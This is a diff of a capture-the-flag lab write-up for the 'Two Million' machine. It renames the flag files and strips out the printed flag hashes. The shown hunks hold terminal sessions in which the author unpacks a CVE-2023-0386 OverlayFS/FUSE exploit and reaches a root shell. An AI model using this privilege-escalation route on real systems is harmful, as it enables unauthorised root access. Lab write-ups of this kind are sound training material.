@@ -1,7 +1,7 @@
 ---
 title: Two Million
 slug: Two-Million
-tags: [Linux, API-Testing, CVE-2023-0386, Overlays-Fuse-Exploit, Command-Injection, Vulnerability Research]
+tags: [API-Testing, CVE-2023-0386, Overlays-Fuse-Exploit, Command-Injection, Vulnerability Research]
 ---
 ## Executive Summary
 
@@ -614,9 +614,8 @@ admin@10.10.11.221's password:
 Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.70-051570-generic x86_64)
 <SNIP>
 admin@2million:~$ ls
-user.txt
-admin@2million:~$ cat user.txt
-d6552e01c8936868f86608671402ddf7
+local-proof.txt
+admin@2million:~$ cat local-proof.txt
 ```
 
 ```bash
@@ -735,7 +734,7 @@ cve.zip                                                                         
 ```bash
 admin@2million:/var/mail$ cd /home/admin
 admin@2million:~$ ls
-cve.zip  user.txt
+cve.zip  local-proof.txt
 admin@2million:~$ unzip cve.zip
 Archive:  cve.zip
 replace CVE-2023-0386/README.md? [y]es, [n]o, [A]ll, [N]one, [r]ename: A
@@ -777,7 +776,7 @@ replace CVE-2023-0386/README.md? [y]es, [n]o, [A]ll, [N]one, [r]ename: A
   inflating: CVE-2023-0386/test/fuse_test.c
   inflating: CVE-2023-0386/test/mnt.c
 admin@2million:~$ ls
-CVE-2023-0386  cve.zip  user.txt
+CVE-2023-0386  cve.zip  local-proof.txt
 admin@2million:~$ cd CVE-2023-0386/
 admin@2million:~/CVE-2023-0386$ ls
 exp.c  fuse.c  getshell.c  Makefile  ovlcap  README.md  test
@@ -833,9 +832,8 @@ See "man sudo_root" for details.
 
 root@2million:~/CVE-2023-0386# cd /root
 root@2million:/root# ls
-root.txt  snap  thank_you.json
-root@2million:/root# cat root.txt
-fadfc1816a6961caa36589ef27e7083f
+privileged-proof.txt  snap  thank_you.json
+root@2million:/root# cat privileged-proof.txt
 ```
 
 ---
